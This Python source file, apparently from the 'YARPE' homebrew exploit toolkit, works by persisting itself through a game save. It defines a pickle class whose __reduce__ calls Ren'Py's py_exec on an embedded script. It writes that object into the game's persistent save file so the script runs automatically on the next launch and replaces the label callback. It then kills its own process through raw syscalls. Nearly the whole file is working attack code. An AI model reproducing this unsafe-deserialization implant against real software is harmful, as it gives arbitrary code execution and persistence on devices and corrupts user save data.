import pickle
import zlib
import renpy
from utils.rp import log
from utils.conversion import u64_to_i64
from errors.socket import SocketError
from sc import sc
from constants import SYSCALL

PERSISTENT_PATH = "/saves/persistent"

SCRIPT = """
import os
import sys
import traceback

# Add YARPE folder to Python path
sys.path.insert(0, "/saves/yarpe")

class YarpeState(object):
    def __init__(self):
        self.logs = []
        self.game_initialized = False

renpy.store.yarpe_state = YarpeState()
ys = renpy.store.yarpe_state

# ---------------------------------------------------------
# Logging
# ---------------------------------------------------------

def ylog(msg):
    ys.logs.append(msg)
    if len(ys.logs) > 400:
        del ys.logs[0:100]

ylog("YARPE: Initialized from persistent bootstrap.")

# ---------------------------------------------------------
# Label Callback Logic
# ---------------------------------------------------------

def yarpe_label_callback(label, abnormal):
    ylog("LABEL: %s (abnormal=%r)" % (label, abnormal))

    if label == "splashscreen" and not ys.game_initialized:
        ys.game_initialized = True
        ylog("YARPE: Entered _call__enter_game_menu_0 → autoloading slot '1-1'.")

        try:
            renpy.load("1-1")
        except Exception as e:
            ylog("YARPE ERROR: renpy.load('1-1') failed: %r" % e)

# Install callback
renpy.config.label_callback = yarpe_label_callback
ylog("YARPE: label_callback replaced with yarpe_label_callback.")

"""


class Yummy(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT,)

SYSCALL["getpid"] = 20
SYSCALL["kill"] = 37

SIGKILL = 9


def kill_game():
    pid = u64_to_i64(sc.syscalls.getpid())
    if pid < 0:
        raise Exception(
            "getpid failed with return value %d, error %d\n%s"
            % (
                pid,
                sc.syscalls.getpid.errno,
                sc.syscalls.getpid.get_error_string(),
            )
        )

    ret = u64_to_i64(sc.syscalls.kill(pid, SIGKILL))
    if ret < 0:
        raise SocketError(
            "kill failed with return value %d, error %d\n%s"
            % (
                ret,
                sc.syscalls.kill.errno,
                sc.syscalls.kill.get_error_string(),
            )
        )

def main():
    log("=== YARPE: Injecting YARPE into persistent renpy file. ===")
    log("WARNING: This modification will make the game UNPLAYABLE until you reset/delete the persistent save file.")

    p = renpy.game.persistent

    # ---------------------------------------------------------
    # Inject the Yummy trigger
    # ---------------------------------------------------------
    log("Injecting YARPE trigger into persistent object...")

    p.yarpe_trigger = Yummy()
    p._changed = True   # Forces Ren'Py to rewrite persistent safely

    # ---------------------------------------------------------
    # Re-pickle persistent (protocol 2) and recompress
    # ---------------------------------------------------------
    log("Serializing modified persistent...")

    try:
        raw_data = pickle.dumps(p, protocol=2)
    except Exception as e:
        log("ERROR: pickle.dumps failed: %s" % e)
        return

    try:
        compressed_data = zlib.compress(raw_data)
    except Exception as e:
        log("ERROR: zlib.compress failed: %s" % e)
        return

    log("Compressed persistent size: %d bytes" % len(compressed_data))

    # ---------------------------------------------------------
    # Write persistent back to disk
    # ---------------------------------------------------------
    log("Writing modified persistent to disk at %s..." % PERSISTENT_PATH)

    try:
        with open(PERSISTENT_PATH, "wb") as f:
            f.write(compressed_data)
    except Exception as e:
        log("ERROR: Failed to write persistent file: %s" % e)
        return

    log("YARPE trigger installed successfully. Exploit will autoload in the next game launch.")
    log("IMPORTANT: The game will not function normally until the persistent save is reset!")

main()
log("Press X(or O) to exit the game.{w}")
kill_game()
